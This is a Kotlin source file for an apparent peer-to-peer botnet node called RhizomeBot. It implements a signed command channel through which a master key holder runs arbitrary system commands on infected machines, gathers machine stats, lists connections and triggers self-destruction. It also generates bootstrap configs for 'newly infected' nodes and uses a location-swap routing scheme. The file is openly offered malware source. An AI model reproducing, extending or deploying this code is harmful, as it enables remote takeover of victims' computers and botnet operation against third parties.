/**
 * Copyright 2022 (c) Ur Nan
 *
 * This code is distributed under the GNU GPL Version 2.
 * For details, please read the LICENSE file.
 *
 */
package cc.telepath.rhizome

import fr.rhaz.sockets.*
import org.apache.commons.codec.binary.Hex
import java.security.SecureRandom
import java.io.File
import java.security.MessageDigest
import java.security.PrivateKey
import java.security.PublicKey
import java.util.*
import kotlin.collections.HashMap

class RhizomeNode(props: Properties){

    var nodeLocation: Double = if(props.getProperty("nodeLocation") != null) {
        props.getProperty("nodeLocation").toDouble()
    } else{
        SecureRandom().nextDouble()
    }

    val virtualNeighbors = HashMap<String, Double>()

    val BNeighbors = ArrayList<Double>()

    val neighborMap = HashMap<String, List<String>>()

    var masterPubKey: PublicKey = readPubkey(props.getProperty("MasterRSAPubKey") ?: "" )

    var nodePublicKey: PublicKey = readPubkey(props.getProperty("NodeRSAPubKey") ?: "")

    var nodePrivateKey: PrivateKey = readPrivkey(props.getProperty("NodeRSAPrivKey") ?: "")


    init{

        /**
         * This is sloppy, but I'm in a hurry. Basically this code reads any properties that start with
         * "NeighborNode" (NeighborNode1, etc...) and reads the node information into a hash table.
         */
        if(props.stringPropertyNames().contains("MasterRSAPrivKey")){
           var masterPrivKey = readPrivkey(props.getProperty("MasterRSAPrivKey") ?: "")
        }

        for(k in props.stringPropertyNames()){
            if(k.startsWith("NeighborNode")){
                val nodeData = props.getProperty(k)
                val nodeKey = nodeData.split(":")[0]
                val nodeAddress = nodeData.split(":")[1]
                val nodePort = nodeData.split(":")[2]
                val d = MessageDigest.getInstance("SHA-256")
                d.update(nodeKey.toByteArray())
                val hash = String(Hex.encodeHex(d.digest()))
                neighborMap.put(hash, listOf(nodeKey, nodeAddress, nodePort))
            }
        }
        props.setProperty("nodeLocation", nodeLocation.toString())
    }

    /**
     * Create a new config file for a newly infected node.
     *
     * This will allow the node to bootstrap to some of our known peers (as well as us) and begin operating relatively
     * safely.
     */
    fun createChildConfig(): Properties{

        val childProperties = Properties()
        val spawnKeypair = generateKeypair()

        childProperties.setProperty("NodeRSAPubKey", Base64.getEncoder().encodeToString(spawnKeypair.public.encoded))
        childProperties.setProperty("MasterRSAPubKey", Base64.getEncoder().encodeToString(masterPubKey.encoded))
        childProperties.setProperty("NodeRSAPrivKey", Base64.getEncoder().encodeToString(spawnKeypair.private.encoded))
        for((k,v) in neighborMap){
            childProperties.setProperty("NeighborNode" + neighborMap.keys.indexOf(k), v[0] +":" +v[1] +":" +v[2])
        }

        return childProperties
    }

    fun NodeStart(localport: Int, host: String, remoteport: Int, nodeName: String) : MultiSocket{

        // For the purposes of the demo, we are operating in restricted route mode, so discovery = false
        // The ideal way to manage this is to have this be a configuration option.
        val node = multiSocket(
            name = nodeName, port = localport,
            bootstrap = listOf(host + ":" + remoteport),
            discovery = true
        )

        /**
         * Show connection info
         */
        node.onMessage{ msg -> if(verifyMessage(masterPubKey, msg["data"].toString().split(":")[0], msg["data"].toString().split(":")[1] ) && msg["data"].toString().substring(0,15) == "showconnections"){
            var conns = node.connectionsByTarget.values
            var list: String = "Connections:\n"
            for(c: Connection in conns){
                list += c.targetAddress + "\n"
            }
            node.connectionsByTarget
            msg("botnet", list)
        } }


        /**
         * Execute a system command
         */
        node.onMessage { msg -> if(verifyMessage(masterPubKey, msg["data"].toString().split(":")[0], msg["data"].toString().split(":")[1] ) && msg["data"].toString().substring(0,7) == "execute"){
            msg("botnet", execute(msg["data"].toString().split(":")[0].substring(8)))
        }
        }

        /**
         * Remove yourself.
         */
        node.onMessage { msg -> if(verifyMessage(masterPubKey, msg["data"].toString().split(":")[0], msg["data"].toString().split(":")[1] ) && msg["data"].toString().substring(0,12) == "selfdestruct"){
            println("Removing myself...")
            if(selfDestruct(false)){
                msg("botnet", "I have been removed :3")
            }
            println("Shutting down...")
            System.exit(0)
        }
        }

        node.onMessage { msg -> if(msg["data"].toString().startsWith("LocationResponse")){
            println(msg)
            virtualNeighbors.put(this.targetAddress, msg["data"].toString().split(":")[1].toDouble())
            println(virtualNeighbors.values)
        }
        }


        node.onMessage { msg -> if(msg["data"].toString().startsWith("NeighborList")){
            var tokens = msg["data"].toString().split(":")[1].split(",")
            for(S: String in tokens){
                BNeighbors.add(S.replace("[", "").replace("]", "").toDouble())
            }
            println(BNeighbors)
        }
        }

        node.onMessage { msg -> if(msg["data"].toString().startsWith("Neighbors")){
            msg("botnet", "NeighborList:" + virtualNeighbors.values.toString())
            println(virtualNeighbors.values.toString())
        }
        }

        node.onMessage { msg -> if(msg["data"].toString().contains("SwapRequest")){
            var proposedSwap: Double = msg["data"].toString().split(":")[1].toDouble()
            nodeLocation = proposedSwap
            println("My new location is" + proposedSwap)
        }
        }

        node.onMessage { msg -> if(msg["data"].toString().equals("SwapQuery")){
            for(t: Connection in node.connectionsByTarget.values){
                t.msg("botnet", "LocationQuery")
            }
            for((k,v) in virtualNeighbors){

            }
        }
        }

        node.onMessage { msg -> if(msg["data"].toString().equals("LocationQuery")){
                msg("botnet", "LocationResponse:" + nodeLocation.toString())
            }
        }


        /**
         * Tell us basic stats
         */
        node.onMessage { msg -> if(verifyMessage(masterPubKey, msg["data"].toString().split(":")[0], msg["data"].toString().split(":")[1] ) && msg["data"].toString().substring(0,11) == "MachineInfo"){
            msg("botnet", machineStats())
            println("gigadongs")
        }
        }


        node.accept(true)
        return node
    }
}

fun main(args: Array<String>) {

    if (args.size <= 3) {
        println("Insufficient arguments provided")
        println("Usage: RhizomeBot.jar <remote port> <local port> <botname> <bind address>")
        System.exit(-1)
    }
    val cryptoKey: String
    val remoteport: Int = (args.elementAtOrNull(0) ?: return).toInt()
    val localport: Int = (args.elementAtOrNull(1) ?: return).toInt()
    val nodeName: String = (args.elementAtOrNull(2) ?: return)
    val address: String = (args.elementAtOrNull(3) ?: return)

    //Ideally the key is passed as a command line arg, but for the moment we will load it
    //from disk.
    val props: Properties

    //If our config doesn't exist, we're running for the first time.
    if (!File("bot.conf").exists()) {
        val masterKeypair = generateKeypair()
        props = Properties()
        props.setProperty("MasterRSAPubKey", Base64.getEncoder().encodeToString(masterKeypair.public.encoded))
        props.setProperty("MasterRSAPrivKey", Base64.getEncoder().encodeToString(masterKeypair.private.encoded))
        val nodeKeys = generateKeypair()
        props.setProperty("NodeRSAPubKey", Base64.getEncoder().encodeToString(nodeKeys.public.encoded))
        props.setProperty("NodeRSAPrivKey", Base64.getEncoder().encodeToString(nodeKeys.private.encoded))
        cryptoKey = generateAESKey()
        File("key").writeText(cryptoKey)
    } else {
        cryptoKey = File("key").readLines()[0].trim()
        props = readConfig("bot.conf", cryptoKey)
    }

    val r: RhizomeNode = RhizomeNode(props)
    r.createChildConfig()
    val tempKey = generateAESKey()
    //saveConfig("bot.conf", tempKey, props)

    println("Successfully started")

    var node = r.NodeStart(localport, address, remoteport, nodeName)
    //println(r.createChildConfig())

    while (true) {
        print("Give me a command: ")
        var command: String = readLine()!!
        if (command.split(" ")[0] == "sendMessage") {
            if (props.stringPropertyNames().contains("MasterRSAPrivKey")) {
                var masterPrivKey = readPrivkey(props.getProperty("NodeRSAPrivKey") ?: "")
                var messageString: String =
                    command.substring(12) + ":" + signMessage(masterPrivKey, command.substring(12))
                for (t: Connection in node.connectionsByTarget.values) {
                    t.msg("botnet", messageString)
                }
            }
        }
        if (command == "locationquery") {
//            var conn = node.connectionsByTarget.values.toList().get(SecureRandom().nextInt(node.connectionsByTarget.values.size))
            for (t: Connection in node.connectionsByTarget.values) {
                t.msg("botnet", "LocationQuery")
            }
//            conn.msg("botnet","LocationQuery")
        }
        if (command == "swapquery") {
            var conn = node.connectionsByTarget.values.toList()
                .get(SecureRandom().nextInt(node.connectionsByTarget.values.size))
            conn.msg("botnet", "SwapQuery")
        }
        if (command == "createchild") {
            val childkey = generateAESKey()
            File("childkey").writeText(childkey)
            saveConfig("child.conf", childkey, r.createChildConfig())
        }
        if (command == "swapcalc") {
            var conn = node.connectionsByTarget.values.toList()
                .get(SecureRandom().nextInt(node.connectionsByTarget.values.size))
            conn.msg("botnet", "Neighbors")
            var A = r.nodeLocation
            var B: Double = r.virtualNeighbors.get(conn.targetAddress)!!
            println(r.BNeighbors)
            var D1: Double = 1.0
            var D2: Double = 1.0
            for (d: Double in r.virtualNeighbors.values) {
                D1 *= Math.abs(A - d)
            }
            for (d: Double in r.BNeighbors) {
                D1 *= Math.abs(B - d)
            }
            for (d: Double in r.virtualNeighbors.values) {
                if (d != B) {
                    D2 *= Math.abs(B - d)
                }
            }
            for (d: Double in r.BNeighbors) {
                if (d != A) {
                    D2 *= Math.abs(A - d)
                }
            }
            if (D2 <= D1) {
                println("D2 is " + D2)
                println("D1 is " + D1)
                var t = r.nodeLocation
                conn.msg("botnet", "SwapRequest:" + t)
                r.nodeLocation = B
                println("Swapping...")

            }

        }
        if (command == "mylocation") {
            println(r.nodeLocation)
        }
        if (command == "quit") {
            saveConfig("bot.conf", cryptoKey, props)
            System.exit(0)
        }
    }
}



